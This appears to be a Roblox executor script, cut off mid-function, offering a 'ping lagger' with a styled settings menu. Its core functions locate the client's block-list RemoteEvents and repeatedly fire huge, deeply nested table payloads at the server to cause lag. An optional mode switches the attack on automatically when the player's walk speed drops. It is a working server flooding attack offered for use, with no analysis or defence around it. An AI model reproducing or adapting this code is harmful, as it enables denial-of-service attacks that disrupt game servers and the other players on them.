local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local plr = Players.LocalPlayer
local plrGui = plr:WaitForChild("PlayerGui")

local IMAGES = {
    "rbxassetid://136327879483232",
    "rbxassetid://103873496799285",
    "rbxassetid://116110824615232",
    "rbxassetid://108138657702122",
    "rbxassetid://109740377478030",
}

local CONFIG_FILE = "BloomvsPingLagger_Config.json"
local DEFAULT_CFG = {
    power = 100000,
    interval = 0.11,
    keybindKb = "L",
    keybindGp = "ButtonR2",
    autoBrainrot = true,
    imageIndex = 1,
}

local cfg = {
    power = DEFAULT_CFG.power,
    interval = DEFAULT_CFG.interval,
    keybindKb = DEFAULT_CFG.keybindKb,
    keybindGp = DEFAULT_CFG.keybindGp,
    autoBrainrot = DEFAULT_CFG.autoBrainrot,
    imageIndex = DEFAULT_CFG.imageIndex,
}

local keybind = Enum.KeyCode.F
local listeningForInput = false

-- ===== PALETA: BLANCO / NEGRO / ROJO =====
local activeColor    = Color3.fromRGB(220, 0, 0)      -- rojo
local inactiveColor  = Color3.fromRGB(255, 255, 255)  -- blanco
local blackColor     = Color3.fromRGB(15, 15, 15)
local whiteColor     = Color3.fromRGB(255, 255, 255)
local redColor       = Color3.fromRGB(220, 0, 0)
local redSoft        = Color3.fromRGB(255, 180, 180)
local grayColor      = Color3.fromRGB(70, 70, 70)

local function saveConfig()
    local data = {
        power = cfg.power,
        interval = cfg.interval,
        keybindKb = cfg.keybindKb,
        keybindGp = cfg.keybindGp,
        autoBrainrot = cfg.autoBrainrot,
        imageIndex = cfg.imageIndex,
        keybind = keybind.Name
    }
    local ok, encoded = pcall(function() return HttpService:JSONEncode(data) end)
    if ok and encoded and writefile then
        pcall(writefile, CONFIG_FILE, encoded)
    end
end

local function loadConfig()
    if not (isfile and readfile and isfile(CONFIG_FILE)) then return end
    local ok, data = pcall(function() return HttpService:JSONDecode(readfile(CONFIG_FILE)) end)
    if not ok or type(data) ~= "table" then return end
    cfg.power = tonumber(data.power) or DEFAULT_CFG.power
    cfg.interval = tonumber(data.interval) or DEFAULT_CFG.interval
    cfg.keybindKb = type(data.keybindKb) == "string" and data.keybindKb or DEFAULT_CFG.keybindKb
    cfg.keybindGp = type(data.keybindGp) == "string" and data.keybindGp or DEFAULT_CFG.keybindGp
    cfg.autoBrainrot = type(data.autoBrainrot) == "boolean" and data.autoBrainrot or DEFAULT_CFG.autoBrainrot
    cfg.imageIndex = math.max(1, math.min(#IMAGES, tonumber(data.imageIndex) or DEFAULT_CFG.imageIndex))
end

loadConfig()

local active = false
local remote = nil
local brainrotMode = false
local lastBrainrotState = false
local manualOverride = false
local pingLoopRunning = false

for _, kid in pairs(plrGui:GetChildren()) do
    if kid.Name == "BloomvsPingLaggerGui" or kid.Name == "SurehubPingLaggerGui" then kid:Destroy() end
end

local screen = Instance.new("ScreenGui")
screen.Name = "BloomvsPingLaggerGui"
screen.ResetOnSpawn = false
screen.DisplayOrder = 15
screen.Parent = plrGui

local function tw(obj, props, t)
    TweenService:Create(obj, TweenInfo.new(t or 0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), props):Play()
end

local function makeDraggable(frame)
    local dragging, dragStart, startPos
    frame.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = i.Position
            startPos = frame.Position
            i.Changed:Connect(function()
                if i.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    frame.InputChanged:Connect(function(i)
        if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
            local d = i.Position - dragStart
            frame.Position = UDim2.new(
                startPos.X.Scale, startPos.X.Offset + d.X,
                startPos.Y.Scale, startPos.Y.Offset + d.Y
            )
        end
    end)
end

local function isGamepadKeyCode(kc)
    if not kc then return false end
    local name = kc.Name
    return name:find("Button") == 1 or name == "DPadUp" or name == "DPadDown" or name == "DPadLeft" or name == "DPadRight" or name == "ButtonSelect" or name == "ButtonStart" or name == "Thumbstick1" or name == "Thumbstick2"
end

local BLACKLISTED = {
    [Enum.KeyCode.Escape] = true,
    [Enum.KeyCode.LeftControl] = true,
    [Enum.KeyCode.Unknown] = true,
}

local MAIN_BASE_H = 89
local MAIN_EXPANDED_H = 300

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 220, 0, MAIN_BASE_H)
mainFrame.Position = UDim2.new(0.5, -110, 0.5, -MAIN_BASE_H/2)
mainFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
mainFrame.BackgroundTransparency = 1
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.ClipsDescendants = true
mainFrame.Parent = screen

local bgImage = Instance.new("ImageLabel")
bgImage.Name = "BackgroundImage"
bgImage.Size = UDim2.new(1, 0, 1, 0)
bgImage.Position = UDim2.new(0,0,0,0)
bgImage.BackgroundTransparency = 1
bgImage.ZIndex = 0
bgImage.Image = IMAGES[cfg.imageIndex] or IMAGES[1]
bgImage.ScaleType = Enum.ScaleType.Stretch
bgImage.ImageColor3 = whiteColor
bgImage.Parent = mainFrame

local function applySelectedImage()
    bgImage.Image = IMAGES[cfg.imageIndex] or IMAGES[1]
end

local bgGradient = Instance.new("UIGradient")
bgGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255,255,255)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 220, 220)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 110, 110)),
})
bgGradient.Rotation = 45
bgGradient.Enabled = false
bgGradient.Parent = bgImage

local bgCorner = Instance.new("UICorner", bgImage)
bgCorner.CornerRadius = UDim.new(0, 10)

Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 10)

local mainStroke = Instance.new("UIStroke", mainFrame)
mainStroke.Color = redColor
mainStroke.Thickness = 1.6
mainStroke.Transparency = 0

makeDraggable(mainFrame)

local titleLabel = Instance.new("TextLabel", mainFrame)
titleLabel.Size = UDim2.new(0, 180, 0, 20)
titleLabel.Position = UDim2.new(0, 8, 0, 4)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "MUST PING LAGGER"
titleLabel.TextColor3 = whiteColor
titleLabel.Font = Enum.Font.GothamBlack
titleLabel.TextSize = 13
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
titleLabel.TextYAlignment = Enum.TextYAlignment.Center
titleLabel.ZIndex = 2

local gearContainer = Instance.new("Frame", mainFrame)
gearContainer.Size = UDim2.new(0, 50, 0, 22)
gearContainer.Position = UDim2.new(1, -56, 0, 5)
gearContainer.BackgroundColor3 = blackColor
gearContainer.BackgroundTransparency = 0
gearContainer.BorderSizePixel = 0
gearContainer.ZIndex = 50
local containerCorner = Instance.new("UICorner", gearContainer)
containerCorner.CornerRadius = UDim.new(0, 4)

local settingsBtn = Instance.new("TextButton", gearContainer)
settingsBtn.Size = UDim2.new(1, 0, 1, 0)
settingsBtn.Position = UDim2.new(0, 0, 0, 0)
settingsBtn.BackgroundColor3 = blackColor
settingsBtn.BackgroundTransparency = 0
settingsBtn.BorderSizePixel = 0
settingsBtn.AutoButtonColor = false
settingsBtn.Text = "Open"
settingsBtn.TextColor3 = whiteColor
settingsBtn.Font = Enum.Font.GothamBold
settingsBtn.TextSize = 10
settingsBtn.ZIndex = 51
local btnCorner = Instance.new("UICorner", settingsBtn)
btnCorner.CornerRadius = UDim.new(0, 4)

local btnStroke = Instance.new("UIStroke", settingsBtn)
btnStroke.Color = redColor
btnStroke.Thickness = 1
btnStroke.Transparency = 0

settingsBtn.MouseEnter:Connect(function()
    settingsBtn.TextColor3 = redSoft
    settingsBtn.BackgroundColor3 = Color3.fromRGB(35,35,35)
end)
settingsBtn.MouseLeave:Connect(function()
    settingsBtn.TextColor3 = whiteColor
    settingsBtn.BackgroundColor3 = blackColor
end)

-- ===== NUEVO FRAME PRINCIPAL (PING LAGGER + SWITCH) =====
local pingFrame = Instance.new("Frame", mainFrame)
pingFrame.Size = UDim2.new(0, 205, 0, 38)
pingFrame.Position = UDim2.new(0, 7, 0, 32)
pingFrame.BackgroundColor3 = blackColor
pingFrame.BackgroundTransparency = 0
pingFrame.BorderSizePixel = 0
pingFrame.ZIndex = 2
Instance.new("UICorner", pingFrame).CornerRadius = UDim.new(0,4)

local pingText = Instance.new("TextLabel", pingFrame)
pingText.Size = UDim2.new(0.6, 0, 1, 0)
pingText.Position = UDim2.new(0, 12, 0, 0)
pingText.BackgroundTransparency = 1
pingText.Text = "PING LAGGER"
pingText.TextColor3 = whiteColor
pingText.Font = Enum.Font.GothamBlack
pingText.TextSize = 14
pingText.TextXAlignment = Enum.TextXAlignment.Left
pingText.ZIndex = 3

-- El Switch Toggle
local toggleSwitch = Instance.new("TextButton", pingFrame)
toggleSwitch.Size = UDim2.new(0, 44, 0, 22)
toggleSwitch.Position = UDim2.new(1, -54, 0.5, -11)
toggleSwitch.BackgroundColor3 = grayColor
toggleSwitch.BorderSizePixel = 0
toggleSwitch.AutoButtonColor = false
toggleSwitch.Text = ""
toggleSwitch.ZIndex = 3
Instance.new("UICorner", toggleSwitch).CornerRadius = UDim.new(1, 0)

local switchStroke = Instance.new("UIStroke", toggleSwitch)
switchStroke.Color = redColor
switchStroke.Thickness = 1
switchStroke.Transparency = 0.5

-- El circulito que se desliza
local toggleKnob = Instance.new("Frame", toggleSwitch)
toggleKnob.Size = UDim2.new(0, 16, 0, 16)
toggleKnob.Position = UDim2.new(0, 3, 0.5, -8) -- Posición OFF (izquierda)
toggleKnob.BackgroundColor3 = whiteColor
toggleKnob.BorderSizePixel = 0
toggleKnob.ZIndex = 4
Instance.new("UICorner", toggleKnob).CornerRadius = UDim.new(1, 0)

local knobStroke = Instance.new("UIStroke", toggleKnob)
knobStroke.Color = Color3.fromRGB(0,0,0)
knobStroke.Transparency = 0.8
knobStroke.Thickness = 1

-- Animación al hacer clic
toggleSwitch.MouseButton1Click:Connect(function()
    flipLag(not active, true)
end)

toggleSwitch.MouseEnter:Connect(function()
    tw(switchStroke, {Transparency=0}, 0.1)
end)
toggleSwitch.MouseLeave:Connect(function()
    if not active then
        tw(switchStroke, {Transparency=0.5}, 0.1)
    end
end)

-- ===== ACTUALIZAR EL SWITCH =====
local function updateToggleButton()
    if active then
        -- Estado ON
        tw(toggleSwitch, {BackgroundColor3 = redColor}, 0.2)
        tw(toggleKnob, {Position = UDim2.new(1, -19, 0.5, -8)}, 0.2)
        tw(switchStroke, {Transparency = 0}, 0.2)
        bgImage.ImageColor3 = redColor
        bgGradient.Enabled = false
    else
        -- Estado OFF
        tw(toggleSwitch, {BackgroundColor3 = grayColor}, 0.2)
        tw(toggleKnob, {Position = UDim2.new(0, 3, 0.5, -8)}, 0.2)
        tw(switchStroke, {Transparency = 0.5}, 0.2)
        bgImage.ImageColor3 = whiteColor
        bgGradient.Enabled = true
    end
end

-- ===== CONFIGURACIÓN (SCROLL) =====
local settingsOpen = false

local settingsScroll = Instance.new("ScrollingFrame", mainFrame)
settingsScroll.Name = "SettingsScroll"
settingsScroll.Size = UDim2.new(1, 0, 1, -78)
settingsScroll.Position = UDim2.new(0, 0, 0, 74)
settingsScroll.BackgroundTransparency = 1
settingsScroll.BorderSizePixel = 0
settingsScroll.ScrollBarThickness = 6
settingsScroll.ScrollBarImageColor3 = redColor
settingsScroll.ScrollBarImageTransparency = 0
settingsScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
settingsScroll.ScrollingDirection = Enum.ScrollingDirection.Y
settingsScroll.ElasticBehavior = Enum.ElasticBehavior.WhenScrollable
settingsScroll.Visible = false
settingsScroll.ZIndex = 20
settingsScroll.Active = true

local scrollPad = Instance.new("UIPadding", settingsScroll)
scrollPad.PaddingLeft = UDim.new(0, 8)
scrollPad.PaddingRight = UDim.new(0, 12)
scrollPad.PaddingTop = UDim.new(0, 2)
scrollPad.PaddingBottom = UDim.new(0, 25)

local scrollLayout = Instance.new("UIListLayout", settingsScroll)
scrollLayout.FillDirection = Enum.FillDirection.Vertical
scrollLayout.SortOrder = Enum.SortOrder.LayoutOrder
scrollLayout.Padding = UDim.new(0, 6)
scrollLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center

local function updateCanvas()
    local contentH = scrollLayout.AbsoluteContentSize.Y
    local padB = scrollPad.PaddingBottom.Offset
    settingsScroll.CanvasSize = UDim2.new(0, 0, 0, contentH + padB + 8)
end

scrollLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateCanvas)

local function applyRowGradient(row)
    row.BackgroundColor3 = whiteColor
    row.BackgroundTransparency = 0
    local grad = Instance.new("UIGradient")
    grad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0,   Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(0.7, Color3.fromRGB(250, 250, 250)),
        ColorSequenceKeypoint.new(1,   Color3.fromRGB(255, 225, 225)),
    })
    grad.Rotation = 0
    grad.Parent = row
    local stroke = Instance.new("UIStroke", row)
    stroke.Color = redColor
    stroke.Transparency = 0.35
    stroke.Thickness = 1
    return grad
end

local function mkInputRow(order, labelText, getValue, onConfirm)
    local row = Instance.new("Frame", settingsScroll)
    row.Size = UDim2.new(1, 0, 0, 30)
    row.LayoutOrder = order
    row.BorderSizePixel = 0
    row.ZIndex = 21
    Instance.new("UICorner", row).CornerRadius = UDim.new(0,4)
    applyRowGradient(row)

    local lbl = Instance.new("TextLabel", row)
    lbl.Size = UDim2.new(0.5,0,1,0)
    lbl.Position = UDim2.new(0,8,0,0)
    lbl.BackgroundTransparency = 1
    lbl.Text = labelText
    lbl.TextColor3 = blackColor
    lbl.Font = Enum.Font.GothamBold
    lbl.TextSize = 10
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.ZIndex = 22

    local box = Instance.new("TextBox", row)
    box.Size = UDim2.new(0,65,0,22)
    box.Position = UDim2.new(1,-73,0.5,-11)
    box.BackgroundColor3 = whiteColor
    box.BackgroundTransparency = 0
    box.BorderSizePixel = 0
    box.Text = tostring(getValue())
    box.TextColor3 = blackColor
    box.Font = Enum.Font.GothamBold
    box.TextSize = 10
    box.ClearTextOnFocus = false
    box.ZIndex = 23
    Instance.new("UICorner", box).CornerRadius = UDim.new(0,4)
    local bs = Instance.new("UIStroke",box)
    bs.Color = redColor
    bs.Transparency = 0.4
    bs.Thickness = 1

    box.Focused:Connect(function()
        tw(bs,{Color=redColor, Transparency=0.05},0.12)
    end)
    box.FocusLost:Connect(function()
        tw(bs,{Color=redColor, Transparency=0.4},0.12)
        local n = tonumber(box.Text)
        if n then
            onConfirm(n)
            box.Text = tostring(getValue())
            saveConfig()
        else
            box.Text = tostring(getValue())
        end
    end)
    return box
end

local autoBrainrotBtn
local function createBrainrotRow(order)
    local row = Instance.new("Frame", settingsScroll)
    row.Size = UDim2.new(1, 0, 0, 30)
    row.LayoutOrder = order
    row.BorderSizePixel = 0
    row.ZIndex = 21
    Instance.new("UICorner", row).CornerRadius = UDim.new(0,4)
    applyRowGradient(row)

    local lbl = Instance.new("TextLabel", row)
    lbl.Size = UDim2.new(0.6,0,1,0)
    lbl.Position = UDim2.new(0,8,0,0)
    lbl.BackgroundTransparency = 1
    lbl.Text = "AUTO BRAINROT"
    lbl.TextColor3 = blackColor
    lbl.Font = Enum.Font.GothamBold
    lbl.TextSize = 10
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.ZIndex = 22

    local toggleBtn = Instance.new("TextButton", row)
    toggleBtn.Size = UDim2.new(0,50,0,22)
    toggleBtn.Position = UDim2.new(1,-58,0.5,-11)
    toggleBtn.BackgroundColor3 = cfg.autoBrainrot and redColor or whiteColor
    toggleBtn.BackgroundTransparency = 0
    toggleBtn.BorderSizePixel = 0
    toggleBtn.AutoButtonColor = false
    toggleBtn.Text = cfg.autoBrainrot and "ON" or "OFF"
    toggleBtn.TextColor3 = cfg.autoBrainrot and whiteColor or blackColor
    toggleBtn.Font = Enum.Font.GothamBlack
    toggleBtn.TextSize = 9
    toggleBtn.ZIndex = 23
    Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(0, 8)
    local tStr = Instance.new("UIStroke", toggleBtn)
    tStr.Color = redColor
    tStr.Transparency = 0.2
    tStr.Thickness = 1

    toggleBtn.MouseButton1Click:Connect(function()
        cfg.autoBrainrot = not cfg.autoBrainrot
        toggleBtn.Text = cfg.autoBrainrot and "ON" or "OFF"
        toggleBtn.BackgroundColor3 = cfg.autoBrainrot and redColor or whiteColor
        toggleBtn.TextColor3 = cfg.autoBrainrot and whiteColor or blackColor
        saveConfig()
    end)
    autoBrainrotBtn = toggleBtn
    return toggleBtn
end

local keybindRow
local function createKeybindRow(order, labelText, which)
    local row = Instance.new("Frame", settingsScroll)
    row.Size = UDim2.new(1, 0, 0, 30)
    row.LayoutOrder = order
    row.BorderSizePixel = 0
    row.ZIndex = 21
    Instance.new("UICorner", row).CornerRadius = UDim.new(0,4)
    applyRowGradient(row)

    local lbl = Instance.new("TextLabel", row)
    lbl.Size = UDim2.new(0.4,0,1,0)
    lbl.Position = UDim2.new(0,8,0,0)
    lbl.BackgroundTransparency = 1
    lbl.Text = labelText
    lbl.TextColor3 = blackColor
    lbl.Font = Enum.Font.GothamBold
    lbl.TextSize = 10
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.ZIndex = 22

    local kbBtn = Instance.new("TextButton", row)
    kbBtn.Size = UDim2.new(0,65,0,22)
    kbBtn.Position = UDim2.new(1,-73,0.5,-11)
    kbBtn.BackgroundColor3 = whiteColor
    kbBtn.BackgroundTransparency = 0
    kbBtn.BorderSizePixel = 0
    kbBtn.AutoButtonColor = false
    local displayKey = which == "kb" and cfg.keybindKb or cfg.keybindGp
    kbBtn.Text = displayKey ~= "" and displayKey or "None"
    kbBtn.TextColor3 = blackColor
    kbBtn.Font = Enum.Font.GothamBlack
    kbBtn.TextSize = 9
    kbBtn.ZIndex = 23
    Instance.new("UICorner", kbBtn).CornerRadius = UDim.new(0,4)
    local kbStroke = Instance.new("UIStroke", kbBtn)
    kbStroke.Color = redColor
    kbStroke.Transparency = 0.4
    kbStroke.Thickness = 1

    kbBtn.MouseButton1Click:Connect(function()
        if listeningForInput then return end
        listeningForInput = which
        kbBtn.Text = "[?]"
        kbBtn.BackgroundColor3 = redColor
        kbBtn.TextColor3 = whiteColor
    end)

    if which == "kb" then keybindRow = kbBtn end
    return kbBtn
end

local imageBtn
local function createImageRow(order)
    local row = Instance.new("Frame", settingsScroll)
    row.Size = UDim2.new(1, 0, 0, 30)
    row.LayoutOrder = order
    row.BorderSizePixel = 0
    row.ZIndex = 21
    Instance.new("UICorner", row).CornerRadius = UDim.new(0,4)
    applyRowGradient(row)

    local lbl = Instance.new("TextLabel", row)
    lbl.Size = UDim2.new(0.4,0,1,0)
    lbl.Position = UDim2.new(0,8,0,0)
    lbl.BackgroundTransparency = 1
    lbl.Text = "IMAGE"
    lbl.TextColor3 = blackColor
    lbl.Font = Enum.Font.GothamBold
    lbl.TextSize = 10
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.ZIndex = 22

    local btn = Instance.new("TextButton", row)
    btn.Size = UDim2.new(0,65,0,22)
    btn.Position = UDim2.new(1,-73,0.5,-11)
    btn.BackgroundColor3 = whiteColor
    btn.BackgroundTransparency = 0
    btn.BorderSizePixel = 0
    btn.AutoButtonColor = false
    btn.Text = tostring(cfg.imageIndex) .. "/" .. tostring(#IMAGES)
    btn.TextColor3 = blackColor
    btn.Font = Enum.Font.GothamBlack
    btn.TextSize = 9
    btn.ZIndex = 23
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0,4)
    local s = Instance.new("UIStroke", btn)
    s.Color = redColor
    s.Transparency = 0.4
    s.Thickness = 1

    btn.MouseButton1Click:Connect(function()
        cfg.imageIndex = (cfg.imageIndex % #IMAGES) + 1
        btn.Text = tostring(cfg.imageIndex) .. "/" .. tostring(#IMAGES)
        applySelectedImage()
        saveConfig()
    end)
    imageBtn = btn
end

local ORDER = 1

local powerBox = mkInputRow(ORDER, "POWER", function() return cfg.power end, function(v) cfg.power = math.max(1, v) end)
ORDER = ORDER + 1

local delayBox = mkInputRow(ORDER, "DELAY", function() return cfg.interval end, function(v) cfg.interval = math.max(0.001, v) end)
ORDER = ORDER + 1

createBrainrotRow(ORDER)
ORDER = ORDER + 1

createKeybindRow(ORDER, "KEYBOARD", "kb")
ORDER = ORDER + 1

createKeybindRow(ORDER, "CONTROLLER", "gp")
ORDER = ORDER + 1

createImageRow(ORDER)
ORDER = ORDER + 1

local div = Instance.new("Frame", settingsScroll)
div.Size = UDim2.new(1, 0, 0, 1)
div.LayoutOrder = ORDER
div.BackgroundColor3 = redColor
div.BackgroundTransparency = 0.3
div.BorderSizePixel = 0
div.ZIndex = 21
ORDER = ORDER + 1

local resetBtn = Instance.new("TextButton", settingsScroll)
resetBtn.Size = UDim2.new(1, 0, 0, 26)
resetBtn.LayoutOrder = ORDER
resetBtn.BackgroundColor3 = whiteColor
resetBtn.BackgroundTransparency = 0
resetBtn.BorderSizePixel = 0
resetBtn.AutoButtonColor = false
resetBtn.Text = "RESET DEFAULTS"
resetBtn.TextColor3 = blackColor
resetBtn.Font = Enum.Font.GothamBold
resetBtn.TextSize = 10
resetBtn.ZIndex = 21
Instance.new("UICorner", resetBtn).CornerRadius = UDim.new(0,4)
do
    local rGrad = Instance.new("UIGradient")
    rGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0,   Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(0.6, Color3.fromRGB(255, 230, 230)),
        ColorSequenceKeypoint.new(1,   Color3.fromRGB(255, 120, 120)),
    })
    rGrad.Rotation = 0
    rGrad.Parent = resetBtn
    local resetStroke = Instance.new("UIStroke", resetBtn)
    resetStroke.Color = redColor
    resetStroke.Transparency = 0.3
    resetStroke.Thickness = 1
end

resetBtn.MouseEnter:Connect(function()
    tw(resetBtn,{BackgroundTransparency=0.15},0.1)
end)
resetBtn.MouseLeave:Connect(function()
    tw(resetBtn,{BackgroundTransparency=0},0.1)
end)

task.defer(updateCanvas)
task.delay(0.5, updateCanvas)

local confirmBackdrop = Instance.new("Frame")
confirmBackdrop.Name = "ConfirmBackdrop"
confirmBackdrop.Size = UDim2.new(1,0,1,0)
confirmBackdrop.BackgroundColor3 = Color3.fromRGB(0,0,0)
confirmBackdrop.BackgroundTransparency = 0.45
confirmBackdrop.BorderSizePixel = 0
confirmBackdrop.Visible = false
confirmBackdrop.ZIndex = 50
confirmBackdrop.Parent = screen

local confirmBox = Instance.new("Frame", confirmBackdrop)
confirmBox.Size = UDim2.new(0,200,0,100)
confirmBox.Position = UDim2.new(0.5,-100,0.5,-50)
confirmBox.BackgroundColor3 = blackColor
confirmBox.BackgroundTransparency = 0
confirmBox.BorderSizePixel = 0
confirmBox.ZIndex = 51
Instance.new("UICorner", confirmBox).CornerRadius = UDim.new(0,10)
local cStroke = Instance.new("UIStroke", confirmBox)
cStroke.Color = redColor
cStroke.Thickness = 1.5

local confirmLbl = Instance.new("TextLabel", confirmBox)
confirmLbl.Size = UDim2.new(1,-16,0,50)
confirmLbl.Position = UDim2.new(0,8,0,8)
confirmLbl.BackgroundTransparency = 1
confirmLbl.Text = "RESET ALL SETTINGS?"
confirmLbl.TextWrapped = true
confirmLbl.TextColor3 = whiteColor
confirmLbl.Font = Enum.Font.GothamBold
confirmLbl.TextSize = 10
confirmLbl.ZIndex = 52

local confirmYes = Instance.new("TextButton", confirmBox)
confirmYes.Size = UDim2.new(0,86,0,26)
confirmYes.Position = UDim2.new(0,8,1,-34)
confirmYes.BackgroundColor3 = redColor
confirmYes.BorderSizePixel = 0
confirmYes.AutoButtonColor = false
confirmYes.Text = "CONFIRM"
confirmYes.TextColor3 = whiteColor
confirmYes.Font = Enum.Font.GothamBlack
confirmYes.TextSize = 10
confirmYes.ZIndex = 52
Instance.new("UICorner", confirmYes).CornerRadius = UDim.new(0,4)
local yesStroke = Instance.new("UIStroke", confirmYes)
yesStroke.Color = whiteColor
yesStroke.Thickness = 1
yesStroke.Transparency = 0.2

local confirmNo = Instance.new("TextButton", confirmBox)
confirmNo.Size = UDim2.new(0,86,0,26)
confirmNo.Position = UDim2.new(1,-94,1,-34)
confirmNo.BackgroundColor3 = blackColor
confirmNo.BorderSizePixel = 0
confirmNo.AutoButtonColor = false
confirmNo.Text = "CANCEL"
confirmNo.TextColor3 = whiteColor
confirmNo.Font = Enum.Font.GothamBold
confirmNo.TextSize = 10
confirmNo.ZIndex = 52
Instance.new("UICorner", confirmNo).CornerRadius = UDim.new(0,4)
local noStroke = Instance.new("UIStroke", confirmNo)
noStroke.Color = redColor
noStroke.Thickness = 1
noStroke.Transparency = 0.2

confirmYes.MouseEnter:Connect(function()
    tw(confirmYes,{BackgroundColor3=Color3.fromRGB(255,30,30)},0.1)
end)
confirmYes.MouseLeave:Connect(function()
    tw(confirmYes,{BackgroundColor3=redColor},0.1)
end)
confirmNo.MouseEnter:Connect(function()
    tw(confirmNo,{TextColor3=redSoft},0.1)
end)
confirmNo.MouseLeave:Connect(function()
    tw(confirmNo,{TextColor3=whiteColor},0.1)
end)

local function hideConfirm()
    confirmBackdrop.Visible = false
end
confirmNo.MouseButton1Click:Connect(hideConfirm)

confirmYes.MouseButton1Click:Connect(function()
    cfg.power = DEFAULT_CFG.power
    cfg.interval = DEFAULT_CFG.interval
    cfg.keybindKb = DEFAULT_CFG.keybindKb
    cfg.keybindGp = DEFAULT_CFG.keybindGp
    cfg.autoBrainrot = DEFAULT_CFG.autoBrainrot
    cfg.imageIndex = DEFAULT_CFG.imageIndex
    powerBox.Text = tostring(cfg.power)
    delayBox.Text = tostring(cfg.interval)
    if autoBrainrotBtn then
        autoBrainrotBtn.Text = cfg.autoBrainrot and "ON" or "OFF"
        autoBrainrotBtn.BackgroundColor3 = cfg.autoBrainrot and redColor or whiteColor
        autoBrainrotBtn.TextColor3 = cfg.autoBrainrot and whiteColor or blackColor
    end
    if keybindRow then
        local display = cfg.keybindKb ~= "" and cfg.keybindKb or "None"
        keybindRow.Text = display
        keybindRow.BackgroundColor3 = whiteColor
        keybindRow.TextColor3 = blackColor
    end
    if imageBtn then
        imageBtn.Text = tostring(cfg.imageIndex) .. "/" .. tostring(#IMAGES)
    end
    applySelectedImage()
    updateToggleButton()
    saveConfig()
    hideConfirm()
end)

resetBtn.MouseButton1Click:Connect(function()
    confirmLbl.Text = "RESET ALL SETTINGS?"
    confirmBackdrop.Visible = true
end)

local function toggleSettings()
    settingsOpen = not settingsOpen
    local targetHeight = settingsOpen and MAIN_EXPANDED_H or MAIN_BASE_H
    settingsScroll.Visible = settingsOpen
    if settingsOpen then
        settingsScroll.CanvasPosition = Vector2.new(0, 0)
        task.defer(updateCanvas)
        task.delay(0.25, updateCanvas)
    end
    if settingsOpen and keybindRow then
        local display = cfg.keybindKb ~= "" and cfg.keybindKb or "None"
        keybindRow.Text = display
        keybindRow.BackgroundColor3 = whiteColor
        keybindRow.TextColor3 = blackColor
    end
    tw(mainFrame, {Size = UDim2.new(0, 220, 0, targetHeight)}, 0.2)
end

settingsBtn.MouseButton1Click:Connect(toggleSettings)

local function findRemote()
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    if not rrs then return nil end
    local remote
    for _, name in ipairs({"SetPlayerBlockList","UpdatePlayerBlockList","SetBlockList","UpdateBlockList"}) do
        local r = rrs:FindFirstChild(name)
        if r and r:IsA("RemoteEvent") then
            remote = r
            break
        end
    end
    if not remote then
        for _, c in ipairs(rrs:GetChildren()) do
            if c:IsA("RemoteEvent") and c.Name:find("Block") then
                remote = c
                break
            end
        end
    end
    return remote
end

remote = findRemote()

local function buildPayload(power)
    local main = {}
    local nested = {{}}
    local current = nested[1]
    for _ = 1, 186 do
        local n = {}
        table.insert(current, n)
        current = n
    end
    local maxRep = math.min(math.floor(power / 188), 10000)
    for _ = 1, maxRep do
        table.insert(main, nested)
    end
    return main
end

local function runPingLoop()
    if not active or not remote then
        pingLoopRunning = false
        return
    end
    pingLoopRunning = true
    local delay = cfg.interval
    while active and remote and pingLoopRunning do
        local payload = buildPayload(cfg.power)
        local ok = pcall(function()
            remote:FireServer(payload)
        end)
        if not ok then
            delay = math.min(delay * 1.5, 0.5)
        else
            delay = math.max(delay * 0.995, 0.05)
        end
        task.wait(delay)
    end
    pingLoopRunning = false
end

function flipLag(state, isManual)
    if not state and pingLoopRunning then
        pingLoopRunning = false
    end
    active = state
    if isManual then
        if brainrotMode then
            manualOverride = not state
        else
            manualOverride = false
        end
    end
    if active then
        if not remote then
            remote = findRemote()
            if not remote then
                active = false
                updateToggleButton()
                return
            end
        end
        updateToggleButton()
        task.spawn(runPingLoop)
    else
        updateToggleButton()
    end
end

RunService.Heartbeat:Connect(function()
    if not cfg.autoBrainrot then
        if brainrotMode then
            brainrotMode = false
            lastBrainrotState = false
            if active then
                flipLag(false, false)
            end
        end
        return
    end
    local char = plr.Character
    if not char then return end
    local hum = char:FindFirstChild("Humanoid")
    if not hum then return end
    local currentSpeed = hum.WalkSpeed
    if currentSpeed < 25 then
        if not lastBrainrotState then
            brainrotMode = true
            lastBrainrotState = true
            manualOverride = false
            if not active then
                flipLag(true, false)
            end
        end
    else
        if lastBrainrotState then
            brainrotMode = false
            lastBrainrotState = false
            manualOverride = false
            if active then
                flipLag(false, false)
            end
        end
    end
end)

local inputConnection
inputConnection = UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    local kc = input.KeyCode
